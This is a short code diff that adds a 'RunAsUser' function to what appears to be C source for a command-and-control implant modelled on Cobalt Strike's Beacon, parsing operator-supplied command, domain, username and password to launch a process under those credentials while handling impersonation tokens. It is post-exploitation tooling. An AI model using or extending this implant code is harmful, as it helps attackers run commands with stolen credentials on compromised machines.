@@ -1177,6 +1177,39 @@ BOOL RunAsUserInternal(LPCCH domain, LPCCH username, LPCCH password, LPCCH cmd, 
 	return result;
 }
 
+void RunAsUser(char* buffer, int length)
+{
+	datap* locals = BeaconDataAlloc(0x4C00);
+	char* cmd = BeaconDataPtr(locals, 0x4000);
+	char* domain = BeaconDataPtr(locals, 0x400);
+	char* username = BeaconDataPtr(locals, 0x400);
+	char* password = BeaconDataPtr(locals, 0x400);
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+
+	if(!BeaconDataStringCopySafe(&parser, cmd, 0x4000))
+		goto cleanup;
+
+	if (!BeaconDataStringCopySafe(&parser, domain, 0x400))
+		goto cleanup;
+
+	if (!BeaconDataStringCopySafe(&parser, username, 0x400))
+		goto cleanup;
+
+	if (!BeaconDataStringCopySafe(&parser, password, 0x400))
+		goto cleanup;
+
+	IdentityRevertToken();
+	PROCESS_INFORMATION pi;
+	RunAsUserInternal(domain, username, password, cmd, 0, &pi);
+	IdentityImpersonateToken();
+	BeaconCleanupProcess(&pi);
+
+	cleanup:
+	BeaconDataFree(locals);
+}
+
 BOOL RunProcessWithAdjustedCmd(RUN_UNDER_CONFIG* execution)
 {
 	EXPANDED_CMD cmds;
